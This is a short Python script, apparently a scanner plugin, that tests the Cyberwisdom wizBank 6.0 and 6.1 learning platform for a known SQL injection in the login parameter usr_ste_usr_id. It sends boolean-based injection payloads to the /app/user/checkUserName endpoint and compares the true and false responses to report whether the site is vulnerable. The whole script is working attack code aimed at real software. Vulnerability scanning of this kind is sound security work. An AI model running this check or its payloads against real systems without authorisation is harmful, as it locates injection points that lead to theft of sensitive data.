#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Cyberwisdom wizBank学习管理平台SQL注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2016-0166301
author: Lucifer
description: Cyberwisdom wizBank 6.0和6.1版本的登录页面参数usr_ste_usr_id存在SQL注入，可获取敏感数据
'''
import sys
import json
import requests
import warnings
  
  

class usr_id_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['Cyberwisdom wizBank学习管理平台SQL注入漏洞','','']
        reqlst = []
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        for postdata in [r"admin' AND '1'='1", r"admin' AND '1'='2"]:
            payload = {
                "usr_ste_usr_id":postdata,
                }
            vulnurl = self.url + r"/app/user/checkUserName"
            try:
                req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
                reqlst.append(str(req.text))

            except:
                result[2]='不存在'
                return result

        if r"true" in reqlst[0] and r"false" in reqlst[1]:
            if len(req.text) < 50:
                result[2]=  '存在'

            else:
                result[2]=  '不存在'
        return result
if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = usr_id_sqli(sys.argv[1])
    testVuln.run()
